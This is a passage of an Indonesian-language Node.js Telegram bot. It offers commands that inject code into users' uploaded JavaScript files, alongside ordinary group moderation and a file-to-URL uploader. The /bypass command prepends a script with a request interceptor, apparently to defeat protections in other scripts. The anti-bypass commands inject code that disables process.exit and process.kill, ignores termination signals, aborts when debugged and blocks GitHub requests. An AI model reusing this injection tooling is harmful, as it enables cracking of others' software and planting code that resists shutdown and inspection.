        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
    ];
    const colors = [
        chalk.redBright,
        chalk.yellowBright,
        chalk.greenBright,
        chalk.cyanBright,
        chalk.blueBright,
        chalk.magentaBright,
        chalk.whiteBright,
    ];
    let step = 0;
    let colorIndex = 0;
    setInterval(() => {
        console.clear();
        console.log(chalk.cyanBright(\`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░\`));
       axios.interceptors.request.use(vvvvvvv2, errorInterceptor);
        const color = colors[colorIndex % colors.length];
        console.log(color.bold(progressSteps[step]));
        
        step = (step + 1) % progressSteps.length;
        colorIndex++;
    }, 200);
}
startProgressBar();`;

    const newContent = `${bypassScript}\n${fileContent}`;
    await fs.writeFile(bypassedPath, newContent);
    await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");

    await ctx.replyWithDocument(
      { source: bypassedPath, filename: `bypassed-${file.file_name}` },
      {
        caption: "✅ *File berhasil disuntik bypass!*\nSUKSES BYPAS 🕊",
        parse_mode: "Markdown",
      }
    );
    await updateProgress(ctx, progressMessage, 100, "Bypass Selesai");

    if (await fs.pathExists(bypassedPath)) {
      await fs.unlink(bypassedPath);
      log(`File sementara dihapus: ${bypassedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat bypass", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${
        error.message || "Tidak diketahui"
      }\n_Coba lagi dengan file Javascript yang valid!_`
    );
    if (await fs.pathExists(bypassedPath)) {
      await fs.unlink(bypassedPath);
      log(`File sementara dihapus setelah error: ${bypassedPath}`);
    }
  }
});

bot.command("antibypass", async (ctx) => {
  const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

  if (!isChannelMember || !isGroupMember) {
    return ctx.reply(
      "❌ Anda harus join *channel & group* dulu sebelum memakai command",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
            [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
          ]
        }
      }
    );
  }

  if (!ctx.message.reply_to_message?.document) {
    return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/antibypass`!");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
  }

  const antibypassPath = path.join(__dirname, `antibypassed-${file.file_name}`);

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🛡 AntiBypassBot\n" +
        " ⚙️ Memulai Suntik Anti-Bypass (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES ANTIBYPASS "
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const response = await fetch(fileLink);
    let fileContent = await response.text();

    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    const antibypassScript = `
/* === ANTIBYPASS INJECTED === */
const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, args) {
    console.log("[ANTI-BYPASS] process.exit() dicegah!");
    return;
  }
});

const originalKill = process.kill;
process.kill = function(pid, signal) {
  if(pid === process.pid) {
    console.log("[ANTI-BYPASS] process.kill dicegah!");
  } else {
    return originalKill(pid, signal);
  }
};

["SIGINT","SIGTERM","SIGHUP"].forEach(sig=>{
  process.on(sig, ()=>console.log("[ANTI-BYPASS] Sinyal "+sig+" dicegah!"));
});

if(typeof v8debug === 'object' || /--inspect/.test(process.execArgv.join(' '))) {
  console.log("[ANTI-BYPASS] Debugger terdeteksi! Proses dihentikan.");
  process.exit(1);
}

try {
  const axios = require("axios");
  axios.interceptors.request.use(cfg=>{
    if(cfg.url && /github\\.com|raw\\.githubusercontent\\.com|api\\.github\\.com/.test(cfg.url)) {
      console.log("[ANTI-BYPASS] Akses ke GitHub dicegah:", cfg.url);
    }
    return cfg;
  });
} catch(e) {}

/* =================== END ANTIBYPASS =================== */
`;

    const newContent = `${antibypassScript}\n${fileContent}`;

    await fs.writeFile(antibypassPath, newContent);
    await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");

    await ctx.replyWithDocument(
      { source: antibypassPath, filename: `antibypassed-${file.file_name}` },
      {
        caption: "✅ File berhasil disuntik Anti-Bypass!\nSUKSES ANTIBYPASS 🕊",
        parse_mode: "Markdown",
      }
    );

    await updateProgress(ctx, progressMessage, 100, "Antibypass Selesai");

    if(await fs.pathExists(antibypassPath)) {
      await fs.unlink(antibypassPath);
      log(`File sementara dihapus: ${antibypassPath}`);
    }
  } catch (error) {
    log("Kesalahan saat antibypass", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan file Javascript yang valid!_`
    );
    if(await fs.pathExists(antibypassPath)) {
      await fs.unlink(antibypassPath);
      log(`File sementara dihapus setelah error: ${antibypassPath}`);
    }
  }
});

bot.command("superantibypass", async (ctx) => {
  const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

  if (!isChannelMember || !isGroupMember) {
    return ctx.reply(
      "❌ Anda harus join *channel & group* dulu sebelum memakai command",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
            [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
          ]
        }
      }
    );
  }

  if (!ctx.message.reply_to_message?.document) {
    return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/superantibypass`!");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
  }

  const protectedPath = path.join(__dirname, `protected-${file.file_name}`);

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🛡 Super Anti-Bypass Bot\n" +
        " ⚙️ Memulai Proteksi Ekstra (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES PROTEKSI "
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const response = await fetch(fileLink);
    let fileContent = await response.text();

    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    const superAntibypass = `
/* === SUPER ANTI-BYPASS INJECTED === */

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, args) {
    console.log("[SUPER-ANTIBYPASS] process.exit() dicegah!");
    return;
  }
});
const originalKill = process.kill;
process.kill = function(pid, signal) {
  if(pid === process.pid) {
    console.log("[SUPER-ANTIBYPASS] process.kill dicegah!");
  } else return originalKill(pid, signal);
};

["SIGINT","SIGTERM","SIGHUP"].forEach(sig=>{
  process.on(sig, ()=>console.log("[SUPER-ANTIBYPASS] Sinyal "+sig+" dicegah!"));
});

if(typeof v8debug==='object' || /--inspect/.test(process.execArgv.join(' '))) {
  console.log("[SUPER-ANTIBYPASS] Debugger terdeteksi! Proses dihentikan.");
  process.exit(1);
}

const currentFile = __filename;
const checkHash = () => {
  const originalHash = "${crypto.createHash('sha256').update(fileContent).digest('hex')}";
  const currentHash = crypto.createHash('sha256').update(fs.readFileSync(currentFile,'utf8')).digest('hex');
  if(currentHash !== originalHash) {
    console.log("[SUPER-ANTIBYPASS] File dimodifikasi atau suntik bypass terdeteksi! Proses dihentikan.");
    process.exit(1);
  }
};
setInterval(checkHash, 3000);

try {
  const axios = require("axios");
  axios.interceptors.request.use(cfg=>{
    if(cfg.url && /github\\.com|raw\\.githubusercontent\\.com|api\\.github\\.com/.test(cfg.url)) {
      console.log("[SUPER-ANTIBYPASS] Akses ke GitHub dicegah:", cfg.url);
      throw new Error("Akses dicegah oleh Super Anti-Bypass");
    }
    return cfg;
  });
} catch(e) {}
// =================== END SUPER ANTIBYPASS ===================
`;

    const newContent = `${superAntibypass}\n${fileContent}`;

    await fs.writeFile(protectedPath, newContent);
    await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");

    await ctx.replyWithDocument(
      { source: protectedPath, filename: `protected-${file.file_name}` },
      {
        caption: "✅ *File berhasil disuntik Super Anti-Bypass!* \nSUKSES PROTEKSI 🕊",
        parse_mode: "Markdown",
      }
    );

    await updateProgress(ctx, progressMessage, 100, "Proteksi Selesai");

    if(await fs.pathExists(protectedPath)) {
      await fs.unlink(protectedPath);
      log(`File sementara dihapus: ${protectedPath}`);
    }

  } catch (error) {
    log("Kesalahan saat superantibypass", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan file Javascript yang valid!_`
    );
    if(await fs.pathExists(protectedPath)) {
      await fs.unlink(protectedPath);
      log(`File sementara dihapus setelah error: ${protectedPath}`);
    }
  }
});

bot.command("injectantibypass", async (ctx) => {
  const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

  if (!isChannelMember || !isGroupMember) {
    return ctx.reply(
      "❌ Anda harus join *channel & group* dulu sebelum memakai command",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
            [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
          ]
        }
      }
    );
  }

  if (!ctx.message.reply_to_message?.document) {
    return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/injectantibypass`!");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
  }

  const protectedPath = path.join(__dirname, `protected-${file.file_name}`);

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🛡 Inject Anti-Bypass\n" +
        " ⚙️ Memulai Proteksi Ekstra (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES PROTEKSI "
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const response = await fetch(fileLink);
    let fileContent = await response.text();

    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    const originalHash = crypto.createHash('sha256').update(fileContent).digest('hex');
    const superAntibypassScript = `
/* === SUPER ANTI-BYPASS INJECTED === */
const currentFile = __filename;

const originalHash = "${originalHash}";
const checkFileIntegrity = () => {
  const currentHash = crypto.createHash('sha256').update(fs.readFileSync(currentFile,'utf8')).digest('hex');
  if(currentHash !== originalHash){
    console.log("[ANTI-BYPASS] Suntik bypass terdeteksi! Proses dihentikan.");
    process.exit(1);
  }
};
setInterval(checkFileIntegrity, 3000);

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, args){ console.log("[ANTI-BYPASS] percobaan exit dicegah!"); return; }
});
const originalKill = process.kill;
process.kill = function(pid, sig){
  if(pid === process.pid){ console.log("[ANTI-BYPASS] percobaan kill dicegah!"); } 
  else return originalKill(pid, sig);
};

["SIGINT","SIGTERM","SIGHUP"].forEach(sig=>{
  process.on(sig, ()=>console.log("[ANTI-BYPASS] Sinyal "+sig+" dicegah!"));
});

if(typeof v8debug==='object' || /--inspect/.test(process.execArgv.join(' '))){
  console.log("[ANTI-BYPASS] Debugger terdeteksi! Proses dihentikan.");
  process.exit(1);
}

try {
  const axios = require("axios");
  axios.interceptors.request.use(cfg=>{
    if(cfg.url && cfg.url.includes("bypass-inject")){
      console.log("[ANTI-BYPASS] Percobaan bypass dicegah:", cfg.url);
      throw new Error("Bypass dicegah!");
    }
    return cfg;
  });
} catch(e){}
`;

    const newContent = `${superAntibypassScript}\n${fileContent}`;

    await fs.writeFile(protectedPath, newContent);
    await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");

    await ctx.replyWithDocument(
      { source: protectedPath, filename: `SuperAntiBypass-${file.file_name}` },
      {
        caption: "✅ File berhasil disuntik Super Anti-Bypass! \nSUKSES PROTEKSI 🕊",
        parse_mode: "Markdown",
      }
    );

    await updateProgress(ctx, progressMessage, 100, "Proteksi Selesai");

    if(await fs.pathExists(protectedPath)) {
      await fs.unlink(protectedPath);
      log(`File sementara dihapus: ${protectedPath}`);
    }

  } catch (error) {
    log("Kesalahan saat injectantibypass", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan file Javascript yang valid!_`
    );
    if(await fs.pathExists(protectedPath)) {
      await fs.unlink(protectedPath);
      log(`File sementara dihapus setelah error: ${protectedPath}`);
    }
  }
});

bot.command('tourl', async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    const msg = ctx.message;
    const reply = msg.reply_to_message;

    if (!reply) {
        return ctx.reply("❌ Silakan reply pesan yang berisi media (foto, video, dokumen, audio).");
    }

    try {
        let fileId, contentType;

        if (reply.photo) {
            fileId = reply.photo[reply.photo.length - 1].file_id;
            contentType = 'image/jpeg';
        } else if (reply.video) {
            fileId = reply.video.file_id;
            contentType = 'video/mp4';
        } else if (reply.document) {
            fileId = reply.document.file_id;
            contentType = reply.document.mime_type;
        } else if (reply.audio) {
            fileId = reply.audio.file_id;
            contentType = reply.audio.mime_type;
        } else {
            return ctx.reply("❌ Jenis file tidak didukung.");
        }

        const fileInfo = await ctx.telegram.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
        const fileExt = getFileExtension(contentType);
        const localPath = `./temp_${Date.now()}${fileExt}`;

        const writer = fs.createWriteStream(localPath);
        const response = await axios.get(fileUrl, { responseType: 'stream' });
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const catboxUrl = await CatBox(localPath);
        fs.unlinkSync(localPath);

        if (!catboxUrl) {
            return ctx.reply("❌ Gagal upload ke CatBox.");
        }

        await ctx.reply(`📦 CatBox Link: ${catboxUrl}\n\nᴄʀᴇᴀᴛᴇ ʙʏ ᴅᴇᴀᴛʜ👑`);

    } catch (err) {
        console.error("Error /tourl:", err);
        await ctx.reply("❌ Terjadi kesalahan saat memproses file.");
    }
});

bot.command("info", async (ctx) => {
  const chatId = ctx.chat.id;
  const sender = ctx.from;
  const replyTo = ctx.message.reply_to_message;
  const args = ctx.message.text.split(" ").slice(1);
  const mentionedUsername = args[0]?.replace("@", "");

  function escapeMd(text) {
    if (!text) return "";
    return String(text).replace(/([_*`\[])/g, "\\$1");
  }

  function infoUser(user, chatMember) {
    const fullName = escapeMd(
      user.first_name + (user.last_name ? ` ${user.last_name}` : "")
    );
    
    if (chatMember) {
      status = escapeMd(chatMember.status);
    }
    return `
╭━━━〔 👤 INFO USER 〕━━━⬣
┣ 🆔 ID       : \`${user.id}\`
┣ 👤 Nama     : ${fullName}
┣ 🌐 Username : ${user.username ? `@${escapeMd(user.username)}` : "-"}
╰━━━━━━━━━━━━━━⬣`;
  }

  try {
    if (replyTo?.from) {
      const chatMember = await ctx.telegram.getChatMember(
        chatId,
        replyTo.from.id
      );
      return ctx.reply(infoUser(replyTo.from, chatMember), {
        parse_mode: "Markdown",
        reply_to_message_id: ctx.message.message_id,
      });
    }

    if (mentionedUsername) {
      try {
        const admins = await ctx.telegram.getChatAdministrators(chatId);
        const matchUser = admins.find(
          (admin) =>
            admin.user.username &&
            admin.user.username.toLowerCase() === mentionedUsername.toLowerCase()
        );
        if (!matchUser) {
          return ctx.reply(
            `❌ Tidak dapat menemukan pengguna @${escapeMd(
              mentionedUsername
            )} di grup ini.`,
            { parse_mode: "Markdown" }
          );
        }
        return ctx.reply(infoUser(matchUser.user, matchUser), {
          parse_mode: "Markdown",
          reply_to_message_id: ctx.message.message_id,
        });
      } catch (err) {
        return ctx.reply(
          `⚠️ Gagal mendapatkan info @${escapeMd(
            mentionedUsername
          )}. Pastikan bot admin.`,
          { parse_mode: "Markdown" }
        );
      }
    }

    const chatMember = await ctx.telegram.getChatMember(chatId, sender.id);
    return ctx.reply(infoUser(sender, chatMember), {
      parse_mode: "Markdown",
      reply_to_message_id: ctx.message.message_id,
    });
  } catch (err) {
    console.error("Error info cmd:", err);
    return ctx.reply("❌ Terjadi kesalahan saat mengambil info user.");
  }
});

// === CMD /mute ===
function muteUser(chatId, targetId, duration, raw, reason, ctx) {
  const until = duration > 0 ? Math.floor(Date.now()/1000) + duration : 0;
  ctx.telegram.restrictChatMember(chatId, targetId, {
    permissions: { can_send_messages:false, can_send_media_messages:false, can_send_other_messages:false, can_add_web_page_previews:false },
    until_date: until
  }).then(() => {
    let msg = `✅️ User berhasil di mute`;
    if (duration > 0) msg += ` selama ${raw} (${duration} detik)`;
    if (reason) msg += `\n📝 Reason: ${reason}`;
    ctx.reply(msg);
  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal mute."); });
}

bot.command("mute", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;

  if (ctx.chat.type !== "supergroup") return ctx.reply("❌ Command mute hanya bisa dipakai di *supergroup*.", { parse_mode: "Markdown" });

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status)) return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    const args = ctx.message.text.split(" ").slice(1);
    if (!args.length && !ctx.message.reply_to_message) return ctx.reply("❌ Gunakan reply atau ID/username user untuk mute.");

    let raw = args[0];
    let duration = 0;
    let reason = args.slice(1).join(" ");
    if (raw) {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s:1, m:60, h:3600, d:86400, w:604800, mo:2592000, y:31536000 };
        duration = value * (unitMap[unit] || 0);
      } else {
        reason = args.join(" ");
        raw = null;
      }
    }

    let targetId = null;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
      if (!reason && args.length) reason = args.join(" ");
    } else if (raw) {
      if (/^-?\d+$/.test(raw)) targetId = parseInt(raw);
      else if (raw.startsWith("@")) {
        const username = raw.slice(1).toLowerCase();
        return ctx.telegram.getChatAdministrators(chatId).then(members => {
          const found = members.find(m => m.user.username?.toLowerCase() === username);
          if (found) targetId = found.user.id;
          if (!targetId) return ctx.reply("❌ User tidak ditemukan.");
          muteUser(chatId, targetId, duration, raw, reason, ctx);
        }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal mute."); });
        return;
      }
    }

    if (!targetId) return ctx.reply("❌ User tidak ditemukan.");
    muteUser(chatId, targetId, duration, raw, reason, ctx);

  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

// === CMD /unmute ===
bot.command("unmute", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  if (ctx.chat.type !== "supergroup") return ctx.reply("❌ Command unmute hanya bisa dipakai di *supergroup*.");

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status)) return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    const args = ctx.message.text.split(" ").slice(1);
    let targetId = null;
    if (ctx.message.reply_to_message) targetId = ctx.message.reply_to_message.from.id;
    else if (args.length) {
      const arg = args[0];
      if (/^-?\d+$/.test(arg)) targetId = parseInt(arg);
      else if (arg.startsWith("@")) {
        const username = arg.slice(1).toLowerCase();
        return ctx.telegram.getChatAdministrators(chatId).then(members => {
          const found = members.find(m => m.user.username?.toLowerCase() === username);
          if (found) targetId = found.user.id;
          if (!targetId) return ctx.reply("❌ User tidak ditemukan.");

          ctx.telegram.getChatMember(chatId, targetId).then(target => {
            if (!target) return ctx.reply("❌ User bukan anggota grup.");
            ctx.telegram.restrictChatMember(chatId, targetId, {
              permissions: { can_send_messages:true, can_send_media_messages:true, can_send_other_messages:true, can_add_web_page_previews:true },
              until_date:0
            }).then(()=>ctx.reply("✅ User berhasil di unmute dan bisa chat lagi."))
              .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal unmute."); });
          }).catch(()=>ctx.reply("❌ User bukan anggota grup."));
        }).catch(err=>{ console.log(err.message); ctx.reply("❌ Gagal unmute."); });
      }
    }

    if (!targetId) return ctx.reply("❌ Gunakan reply atau ID user untuk unmute.");
    ctx.telegram.getChatMember(chatId, targetId).then(target => {
      if (!target) return ctx.reply("❌ User bukan anggota grup.");
      ctx.telegram.restrictChatMember(chatId, targetId, {
        permissions: { can_send_messages:true, can_send_media_messages:true, can_send_other_messages:true, can_add_web_page_previews:true },
        until_date:0
      }).then(()=>ctx.reply("✅ User berhasil di unmute dan bisa chat lagi."))
        .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal unmute."); });
    }).catch(()=>ctx.reply("❌ User bukan anggota grup."));

  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

// === CMD /kick ===
bot.command("kick", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  if (ctx.chat.type !== "supergroup") return ctx.reply("❌ Command kick hanya bisa dipakai di *supergroup*.");

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status)) return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    const args = ctx.message.text.split(" ").slice(1);
    let targetId = null;
    if (ctx.message.reply_to_message) targetId = ctx.message.reply_to_message.from.id;
    else if (args.length) {
      const arg = args[0];
      if (/^-?\d+$/.test(arg)) targetId = parseInt(arg);
      else if (arg.startsWith("@")) {
        const username = arg.slice(1).toLowerCase();
        return ctx.telegram.getChatAdministrators(chatId).then(members => {
          const found = members.find(m => m.user.username?.toLowerCase() === username);
          if (found) targetId = found.user.id;
          if (!targetId) return ctx.reply("❌ User tidak ditemukan.");

          ctx.telegram.getChatMember(chatId, targetId).then(target => {
            if (!target) return ctx.reply("❌ User bukan anggota grup.");
            ctx.telegram.kickChatMember(chatId, targetId, {until_date: Math.floor(Date.now()/1000)+45})
            .then(()=>ctx.reply("User berhasil di KICK dari grup."))
            .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal kick."); });
          }).catch(()=>ctx.reply("❌ User bukan anggota grup."));
        }).catch(err=>{ console.log(err.message); ctx.reply("❌ Gagal kick."); });
      }
    }

    if (!targetId) return ctx.reply("❌ Gunakan reply atau ID user untuk kick.");
    ctx.telegram.getChatMember(chatId, targetId).then(target => {
      if (!target) return ctx.reply("❌ User bukan anggota grup.");
      ctx.telegram.kickChatMember(chatId, targetId, {until_date: Math.floor(Date.now()/1000)+45})
      .then(()=>ctx.reply("User berhasil di KICK dari grup."))
      .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal kick."); });
    }).catch(()=>ctx.reply("❌ User bukan anggota grup."));

  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

// === CMD /ban ===
bot.command("ban", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  if (ctx.chat.type !== "supergroup") return ctx.reply("❌ Command ban hanya bisa dipakai di *supergroup*.");

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status)) return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    const args = ctx.message.text.split(" ").slice(1);
    let targetId = null;
    if (ctx.message.reply_to_message) targetId = ctx.message.reply_to_message.from.id;
    else if (args.length) {
      const arg = args[0];
      if (/^-?\d+$/.test(arg)) targetId = parseInt(arg);
      else if (arg.startsWith("@")) {
        const username = arg.slice(1).toLowerCase();
        return ctx.telegram.getChatAdministrators(chatId).then(members => {
          const found = members.find(m => m.user.username?.toLowerCase() === username);
          if (found) targetId = found.user.id;
          if (!targetId) return ctx.reply("❌ User tidak ditemukan.");

          ctx.telegram.getChatMember(chatId, targetId).then(target => {
            if (!target) return ctx.reply("❌ User bukan anggota grup.");
            ctx.telegram.kickChatMember(chatId, targetId)
            .then(()=>ctx.reply("User berhasil di BAN dari grup."))
            .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal ban."); });
          }).catch(()=>ctx.reply("❌ User bukan anggota grup."));
        }).catch(err=>{ console.log(err.message); ctx.reply("❌ Gagal ban."); });
      }
    }

    if (!targetId) return ctx.reply("❌ Gunakan reply atau ID user untuk ban.");
    ctx.telegram.getChatMember(chatId, targetId).then(target => {
      if (!target) return ctx.reply("❌ User bukan anggota grup.");
      ctx.telegram.kickChatMember(chatId, targetId)
      .then(()=>ctx.reply("User berhasil di BAN dari grup."))
      .catch(err=>{ console.error(err.message); ctx.reply("❌ Gagal ban."); });
    }).catch(()=>ctx.reply("❌ User bukan anggota grup."));

  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

// === CMD /unban ===
bot.command("unban", (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;

  if (ctx.chat.type !== "supergroup") 
    return ctx.reply("❌ Command unban hanya bisa dipakai di *supergroup*.");

  ctx.telegram.getChatMember(chatId, senderId).then(member => {
    if (!["administrator","creator"].includes(member.status)) 
      return ctx.reply("❌ CUMAN ADMIN GRUP YANG BISA PAKE INI!!!");

    const args = ctx.message.text.split(" ").slice(1);
    let targetId = null;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else if (args.length) {
      const arg = args[0];

      if (/^-?\d+$/.test(arg)) {
        targetId = parseInt(arg);
      } else if (arg.startsWith("@")) {
        const username = arg.slice(1).toLowerCase();
        return ctx.telegram.getChatAdministrators(chatId).then(members => {
          const found = members.find(m => m.user.username?.toLowerCase() === username);
          if (found) targetId = found.user.id;
          if (!targetId) return ctx.reply("❌ User tidak ditemukan.");

          ctx.telegram.unbanChatMember(chatId, targetId)
            .then(() => ctx.reply("✅ User berhasil di UNBAN, bisa join lagi."))
            .catch(err => { console.error(err.message); ctx.reply("❌ Gagal unban."); });
        }).catch(err => { console.log(err.message); ctx.reply("❌ Gagal unban."); });
      }
    }

    if (!targetId) return ctx.reply("❌ Gunakan reply pesan atau ID user untuk unban.");

    ctx.telegram.unbanChatMember(chatId, targetId)
      .then(() => ctx.reply("✅ User berhasil di UNBAN, bisa join lagi."))
      .catch(err => { console.error(err.message); ctx.reply("❌ Gagal unban."); });

  }).catch(err => { console.error(err.message); ctx.reply("❌ Gagal memeriksa admin."); });
});

// ===== Command Pin =====
bot.command("pin", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Hanya admin yang bisa menggunakan perintah ini.");

    if (!ctx.message.reply_to_message) {
        return ctx.reply("❌ Balas pesan yang ingin dipin!");
    }
    try {
        await ctx.telegram.pinChatMessage(ctx.chat.id, ctx.message.reply_to_message.message_id, { disable_notification: false });
        ctx.reply("✅ Pesan berhasil dipin!");
    } catch (err) {
